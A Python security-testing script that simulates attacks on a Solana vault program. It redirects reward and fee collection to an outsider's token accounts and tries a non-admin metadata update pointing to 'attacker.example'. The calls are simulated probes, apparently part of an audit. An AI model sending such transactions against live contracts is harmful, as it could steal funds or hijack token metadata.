#!/usr/bin/env python3
"""Gates v3: collectRewards + collectFees (non-MM attacker), updateTokenMeta gating."""
import base64, hashlib, json, sys
sys.path.insert(0, "/home/heisenberg/CA/armada/analysis")
from solrpc import *
from simtx import simulate, summarize

PROG = "ArmN3Av2boBg8pkkeCK9UuCN9zSUVc2UQg1qR2sKwm8d"
METAPLEX = "metaqbxxUerdq28cj1RbAWkYQm3ybzjb6a8bt518x1s"
A = "/home/heisenberg/CA/armada/analysis"
samples = json.load(open(f"{A}/ix-full-samples.json"))
r1 = json.load(open(f"{A}/recon1.json"))
d = lambda n: hashlib.sha256(f"global:{n}".encode()).digest()[:8]
ATT = "9HArgPaKd1sBPBSPQvWXqEEc9KbPU5MAAhUp1Y2nJPwZ"  # repeat LP holder, NOT an MM key

def sim(label, payer, accounts, data):
    ix = {"program_id": PROG, "accounts": accounts, "data": data}
    res = simulate([ix], payer)
    summ = summarize(res)
    print(f"\n===== {label} ===== err={summ['err']} CU={summ.get('unitsConsumed')}")
    for l in summ["logs_tail"][-8:]:
        print("   ", l)
    return res

def ata_of(owner, mint):
    r = rpc("getTokenAccountsByOwner", [owner, {"mint": mint}, {"encoding": "jsonParsed"}])
    vals = (r or {}).get("value") or []
    return vals[0]["pubkey"] if vals else None

# ---------- collect_rewards with attacker fee accounts ----------
cr = samples["collect_rewards"][0]
accr = cr["accounts"]
vault_r = accr[3]
vr = r1["vaults"][vault_r]
att_ra = ata_of(ATT, vr["token_mint_a"]); att_rb = ata_of(ATT, vr["token_mint_b"])
print("collect_rewards vault", vault_r[:10], "mints", vr["token_mint_a"][:8], vr["token_mint_b"][:8])
print("attacker ATAs:", att_ra, att_rb)
# mark everything writable except known programs/sysvars; payer signer
PROGS = {accr[2], "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA", "11111111111111111111111111111111"}
def metas_all(accs, signer_idx=0):
    return [(a, i == signer_idx, (a not in PROGS)) for i, a in enumerate(accs)]
sim("collect_rewards replay all-writable", accr[0], metas_all(accr), b58decode(cr["data"]))
accr2 = list(accr); accr2[9] = att_ra or accr2[9]; accr2[10] = att_rb or accr2[10]
sim("collect_rewards ATTACK fee accounts = non-MM attacker ATAs", accr[0], metas_all(accr2), b58decode(cr["data"]))

# ---------- collect_fees mm-fee accounts owned by non-MM attacker ----------
cf = samples["collect_fees"][0]
accf = cf["accounts"]; vault_f = accf[1]; vf = r1["vaults"][vault_f]
att_fa = ata_of(ATT, vf["token_mint_a"]); att_fb = ata_of(ATT, vf["token_mint_b"])
print("\ncollect_fees vault", vault_f[:10], "MM", vf["market_making_key"][:10])
accf2 = list(accf); accf2[11] = att_fa or accf2[11]; accf2[12] = att_fb or accf2[12]
sim("collect_fees ATTACK mmFee accounts = non-MM attacker ATAs", accf[0], metas_all(accf), b58decode(cf["data"]))
sim("collect_fees ATTACK mmFee accounts = non-MM attacker ATAs (variant)", accf[0], metas_all(accf2), b58decode(cf["data"]))

# ---------- updateTokenMeta ----------
VK = "6JwmYu4cveodYbXYtJ3zxTTuSR9mXZb6iENNMnXdUwBK"
v = r1["vaults"][VK]
def metadata_pda(mint):
    return find_pda(["metadata", b58decode(METAPLEX), b58decode(mint)], METAPLEX)[0]
meta_lp = metadata_pda(v["lp_mint"]); meta_a = metadata_pda(v["token_mint_a"]); meta_b = metadata_pda(v["token_mint_b"])
print("\nmetadata PDAs:", meta_lp[:10], meta_a[:10], meta_b[:10])
uri = b"https://attacker.example/x.json"
data = d("update_token_meta") + len(uri).to_bytes(4, "little") + uri
accounts = [
    (ATT, True, True),                 # payer
    (meta_lp, False, True),            # metadataAccount
    (meta_a, False, False),            # tokenAMetadataAccount
    (meta_b, False, False),            # tokenBMetadataAccount
    (VK, False, False),                # clpVault
    (v["lp_mint"], False, False),      # lpMint
    (v["clp"], False, False),          # clp
    (METAPLEX, False, False),          # metadataProgram
    ("SysvarRent111111111111111111111111111111111", False, False),
    ("11111111111111111111111111111111", False, False),
]
sim("updateTokenMeta ATTACK: non-admin payer", ATT, accounts, data)
accounts_admin = list(accounts); accounts_admin[0] = (v["admin_key"], True, True)
sim("updateTokenMeta with admin key as payer (privileged)", v["admin_key"], accounts_admin, data)
